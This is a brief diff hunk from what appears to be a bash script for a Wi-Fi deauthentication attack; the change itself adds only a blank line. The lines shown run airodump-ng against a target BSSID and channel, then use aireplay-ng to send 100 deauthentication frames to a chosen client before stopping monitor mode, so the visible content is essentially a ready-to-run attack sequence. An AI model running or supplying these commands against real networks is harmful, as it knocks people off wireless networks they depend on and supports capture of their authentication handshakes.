@@ -8,3 +8,4 @@ sudo airodump-ng --bssid $bssid -c $ch wlan0mon
 read -p "Enter BSSID of target :" ch1
 sudo aireplay-ng --deauth 100 -a $bssid -c $ch1  wlan0mon
 sudo airmon-ng  stop wlan0mon
+
